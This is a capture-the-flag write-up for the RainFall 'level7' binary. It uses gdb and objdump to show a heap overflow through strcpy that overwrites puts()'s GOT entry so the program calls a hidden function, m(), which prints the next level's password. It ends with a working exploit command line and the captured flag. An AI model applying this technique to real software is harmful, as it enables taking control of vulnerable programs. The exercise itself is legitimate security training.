## level7

The `level7` expects at least two arguments otherwise it will crash. There are two functions, `main()` and `m()` and `m()` is naver called from `main()` we can see it using:
```
(gdb) info functions

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time
0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m                      <-----------------
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
```
Many of those functions are from main because the `m()` functions is a relly short one
```
0x080484f4 <+0>:	push   ebp
0x080484f5 <+1>:	mov    ebp,esp
0x080484f7 <+3>:	sub    esp,0x18
0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
0x08048501 <+13>:	call   0x80483d0 <time@plt>
0x08048506 <+18>:	mov    edx,0x80486e0
0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
0x08048517 <+35>:	mov    DWORD PTR [esp],edx
0x0804851a <+38>:	call   0x80483b0 <printf@plt>
0x0804851f <+43>:	leave
0x08048520 <+44>:	ret
```
Disassembling `main()` we see four calls to `malloc()`, two calls to `strcpy()` *(we know `strpcy()` is vulnerable)*, one call to `fopen()`, one call to `fgets()` and one last call to `puts()`. <br> Every call to `malloc()` is made with an `0x8 bytes`.<br> Both `strcpy()` are taking the arguments as it's seconde parameter `strcpy(*dst, argv[1]) - strcpy(*dst, argv[2])` *(that is the reason it will crash if less than two parameters is passed)*
```
~$ gdb -q level7
b *0x080485a0
b *0x080485bd
(gdb) r
Breakpoint 1, 0x080485a0 in main ()
x/s $edx
0xbffff8c3:	 "AAA"
(gdb) r
Breakpoint 2, 0x080485bd in main ()
x/s $edx
0xbffff8c7:	 "BBB"
```

We can use the first `strcpy(*dest, 20 * 'A' + 08049928)` to overflow  and overwrite the  __address__ *(first argument passed to the second `strcpy(*dest <--, *src)`)* and if we place the __address__ of the `GOT` *(yes the same strategy as in `level5`)* of the function  `puts()` and we place  the __address__ of function `m()` to be passed as argument to the second `strcpy()` this function will execute and we will get our flag.<br>
In the `main()` as already said there will be 4 `malloc()` and the `strcpy()` will copy what we entered as first argument to the first __address__ return by `malloc()` and the second argument will be copied to the last __address__ returned by `malloc()` there are also a call to `fopen()` right after the last `strcpy()` and if we examine one __address__ just before the call we see what the function is trying to open <br>
```
0x080485c7 <+166>:	mov    eax,0x80486eb
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
```
From this we know the program is opening the file that contains our *flag* we just have to wait to it to open the file and call `fgets()` right after and store this value in a global variable <br>
`0x080485e4 <+195>:	mov    DWORD PTR [esp],0x804996` <br> and this same variable is passed to `printf()` in the `m()` program that is never called, check the `m()` function above and you can see the same address being passed to `printf()` and four our happiness just before the `main()` funtions returns there's a call to `puts()` coincidence ?
So our goal here is to modify the address of the `GOT` table that contains the __address__ of `puts()` and place the __address__ of the `m()` functions instead so before returning from `main()` the program will call the `puts()` functions from the this modified __address__ and will call the function we want.<br>
Let's get the _offset_ and prepare the _payload_
```
(gdb) r AAAAAAAAAAAAAAAAAAAAA BBBBBB
Breakpoint 1, 0x080485a0 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x080485bd in main ()
(gdb) x/30xw $esp
0xbffff6a0:	0x08040041	0xbffff8c4	0xb7fd0ff4	0xb7e5ee55
0xbffff6b0:	0xb7fed280	0x00000000	0x0804a028	0x0804a008
0xbffff6c0:	0x08048610	0x00000000	0x00000000	0xb7e454d3
0xbffff6d0:	0x00000003	0xbffff764	0xbffff774	0xb7fdc858
0xbffff6e0:	0x00000000	0xbffff71c	0xbffff774	0x00000000
0xbffff6f0:	0x0804825c	0xb7fd0ff4	0x00000000	0x00000000
0xbffff700:	0x00000000	0xb2243554	0x8560b144	0x00000000
0xbffff710:	0x00000000	0x00000000
```
As we can see passing 'A' * 21 we overwrote by `one byte` the __address__ *0x08040041* so we know our *offset is 20*, we already have the `m()` function __address__ above and the *offset* now find the `puts()` __address__ and  build the *payload*
```
level7@RainFall:~$ objdump -R level7

level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

```
./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print  '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1602709985
```
